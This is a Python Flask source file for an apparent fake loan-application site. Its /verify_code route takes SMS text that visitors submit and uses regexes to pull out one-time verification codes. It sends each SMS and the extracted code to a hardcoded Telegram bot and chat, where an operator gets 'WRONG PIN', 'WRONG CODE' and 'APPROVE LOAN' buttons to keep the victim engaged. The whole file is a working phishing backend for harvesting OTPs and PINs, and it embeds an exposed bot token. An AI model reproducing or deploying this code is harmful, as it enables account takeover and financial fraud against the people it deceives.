from flask import Flask, render_template, request, jsonify
import requests
import re
import json
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = 'your-secret-key-here-change-this'

# ===== TELEGRAM CONFIGURATION =====
TELEGRAM_BOT_TOKEN = '8898988712:AAH8sR5P4Lb2TUKxTWNnO3dMqKNOMRXNGZ4'
TELEGRAM_CHAT_ID = '8589275340'

# ===== HELPER FUNCTIONS =====

def extract_code_from_sms(sms_text):
    """Extract verification code from SMS text"""
    if not sms_text:
        return None
    
    patterns = [
        r'code[:\s]+([a-zA-Z0-9]{6,20})',
        r'verification[:\s]+code[:\s]+([a-zA-Z0-9]{6,20})',
        r'OTP[:\s]+([a-zA-Z0-9]{6,20})',
        r'use the code[:\s]+([a-zA-Z0-9]{6,20})',
        r'([a-zA-Z0-9]{8,20})(?=\s+to\s+complete)',
        r'([a-zA-Z0-9]{8,20})(?=\s+to\s+register)',
        r'([a-zA-Z0-9]{6,20})(?=\s+is\s+your)',
        r'([a-zA-Z0-9]{8,20})(?=\s+for\s+)',
        r'code[:\s]*([a-zA-Z0-9]{6,20})',
        r'\b([a-zA-Z0-9]{8,20})\b'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, sms_text, re.IGNORECASE)
        if match:
            return match.group(1)
    
    # Fallback: find any alphanumeric string 8-20 chars
    words = re.findall(r'\b([a-zA-Z0-9]{8,20})\b', sms_text)
    if words:
        return words[0]
    
    return None

def send_telegram_with_buttons(message, buttons):
    """Send message with inline keyboard buttons"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML',
        'reply_markup': json.dumps({'inline_keyboard': buttons})
    }
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Error: {e}")
        return None

def format_sms_for_telegram(sms_text, extracted_code=None):
    """Format the SMS for Telegram display"""
    if not extracted_code:
        extracted_code = extract_code_from_sms(sms_text) or "Not found"
    
    return f"""
🔐 <b>CODE VERIFICATION</b>

<b>📱 Full SMS:</b>
<code>{sms_text}</code>

<b>🔑 Extracted Code:</b> <code>{extracted_code}</code>

<b>📅 Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Please verify this code.
"""

# ===== ROUTES =====

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/apply')
def apply():
    return render_template('apply.html')

@app.route('/approve')
def approve():
    return render_template('approve.html')

@app.route('/verify_code', methods=['POST'])
def verify_code():
    """Handle code verification submission"""
    try:
        data = request.get_json()
        sms_text = data.get('code', '')
        extracted_code = data.get('extracted_code', '')
        full_sms = data.get('full_sms', '')
        
        if not sms_text and not full_sms:
            return jsonify({
                'status': 'error',
                'message': 'No SMS provided'
            }), 400
        
        sms_to_send = full_sms if full_sms else sms_text
        extracted = extracted_code if extracted_code else extract_code_from_sms(sms_to_send)
        
        message = format_sms_for_telegram(sms_to_send, extracted)
        
        buttons = [
            [
                {'text': '❌ WRONG PIN', 'callback_data': 'wrong_pin'},
                {'text': '❌ WRONG CODE', 'callback_data': 'wrong_code'}
            ],
            [
                {'text': '✅ APPROVE LOAN', 'callback_data': 'approve_loan'}
            ]
        ]
        
        result = send_telegram_with_buttons(message, buttons)
        
        if result and result.get('ok'):
            return jsonify({
                'status': 'success',
                'message': 'Code sent for verification',
                'extracted_code': extracted
            })
        else:
            return jsonify({
                'status': 'error',
                'message': 'Failed to send to Telegram'
            }), 500
            
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/resend_code', methods=['POST'])
def resend_code():
    """Resend verification code"""
    try:
        message = """
🔄 <b>CODE RESEND REQUESTED</b>

A new code has been requested.
Please send the new SMS for verification.
"""
        
        buttons = [
            [
                {'text': '🔄 WAITING FOR NEW SMS', 'callback_data': 'waiting_for_sms'}
            ]
        ]
        
        result = send_telegram_with_buttons(message, buttons)
        
        if result and result.get('ok'):
            return jsonify({
                'status': 'success',
                'message': 'Resend requested'
            })
        else:
            return jsonify({
                'status': 'error',
                'message': 'Failed to send resend request'
            }), 500
            
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    """Handle Telegram webhook for button callbacks"""
    try:
        data = request.get_json()
        
        if 'callback_query' in data:
            callback_data = data['callback_query']
            callback_id = callback_data['id']
            action = callback_data['data']
            
            if action == 'wrong_pin':
                response = "❌ <b>WRONG PIN</b>\nUser entered an incorrect PIN. Please try again."
            elif action == 'wrong_code':
                response = "❌ <b>WRONG CODE</b>\nUser entered an incorrect verification code. Please try again."
            elif action == 'approve_loan':
                response = "✅ <b>LOAN APPROVED</b>\nThe loan has been approved successfully!"
            else:
                response = f"Action: {action}"
            
            # Answer the callback
            answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
            answer_data = {
                'callback_query_id': callback_id,
                'text': 'Action processed',
                'show_alert': False
            }
            requests.post(answer_url, json=answer_data)
            
            # Send confirmation
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': response,
                'parse_mode': 'HTML'
            }
            requests.post(url, json=payload)
            
            return jsonify({'status': 'success'})
        
        return jsonify({'status': 'ok'})
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'status': 'error'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
